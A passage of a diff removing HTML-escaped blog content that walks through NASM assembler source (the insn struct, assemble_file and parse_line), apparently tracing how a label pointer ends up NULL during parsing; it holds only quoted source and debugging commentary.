-    &lt;span class=&quot;n&quot;&gt;operand&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAX_OPERANDS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* the operands, defined as above */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;extop&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;cm&quot;&gt;/* extended operands */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;eops_float&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;cm&quot;&gt;/* true if DD and floating */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;cm&quot;&gt;/* repeat count (TIMES prefix) */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* is there a forward reference? */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;rex_done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* REX prefix emitted? */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;rex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;cm&quot;&gt;/* Special REX Prefix */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vexreg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* Register encoded in VEX prefix */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vex_cm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* Class and M field for VEX prefix */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vex_wlp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;cm&quot;&gt;/* W, P and L information for VEX prefix */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;evex_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* EVEX.P0: [RXB,R',00,mm], P1: [W,vvvv,1,pp] */&lt;/span&gt;
-                                            &lt;span class=&quot;cm&quot;&gt;/* EVEX.P2: [z,L'L,b,V',aaa] */&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttypes&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;evex_tuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;cm&quot;&gt;/* Tuple type for compressed Disp8*N */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;evex_rm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;cm&quot;&gt;/* static rounding mode for AVX512 (EVEX) */&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;evex_brerop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;cm&quot;&gt;/* BR/ER/SAE operand position */&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;assemble_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;depend_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev_offset_changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stall_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Make sure we make forward progress... */&lt;/span&gt;
-
-    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
-
-        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preproc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;globallineno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nasm_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIMIT_LINES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-                &lt;span class=&quot;n&quot;&gt;nasm_fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                           &lt;span class=&quot;s&quot;&gt;&quot;overall line count exceeds the maximum %&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRId64&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                           &lt;span class=&quot;n&quot;&gt;nasm_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIMIT_LINES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-
-            &lt;span class=&quot;cm&quot;&gt;/*
-             * Here we parse our directives; this is not handled by the
-             * main parser.
-             */&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_directives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Just do final cleanup */&lt;/span&gt;
-
-            &lt;span class=&quot;cm&quot;&gt;/* Not a directive, or even something that starts with [ */&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;parse_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optimizing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forwref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globallineno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forwref&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lineno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-                    &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_file&lt;/code&gt; function, there is an object (output_ins) to a structure (struct insn) which contains the informations regarding the opcode being parsed.
-Inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_file&lt;/code&gt;, a function &lt;code class=&quot;highlighter-rouge&quot;&gt;parse_line&lt;/code&gt; is called in order initialize the object.&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn_is_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eval_hints&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hints&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;critical&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;nasm_static_assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P_none&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;nl&quot;&gt;restart_parse:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;stdscan_reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;stdscan_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P_none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* No TIMES either yet */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Assume no label */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eops&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* must do this, whatever happens */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* must initialize this */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evex_rm&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* Ensure EVEX rounding mode is reset */&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evex_brerop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;cm&quot;&gt;/* Reset EVEX broadcasting/ER op position */&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Here the structure’s member label which should be containing the definition of the label is clearly being assigned to NULL.&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn_is_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_INSN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;taken&lt;/span&gt;
-        &lt;span class=&quot;cm&quot;&gt;/* there's a label here */&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_charptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* skip over the optional colon */&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;nasm_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERR_WARNING&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR_WARN_OL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR_PASS1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                  &lt;span class=&quot;s&quot;&gt;&quot;label alone on a line without a colon might be in error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_INSN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I_EQU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-            &lt;span class=&quot;cm&quot;&gt;/*
-             * FIXME: location.segment could be NO_SEG, in which case
-             * it is possible we should be passing 'absolute.segment'. Look into this.
-             * Work out whether that is *really* what we should be doing.
-             * Generally fix things. I think this is right as it is, but
-             * am still not certain.
-             */&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;define_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
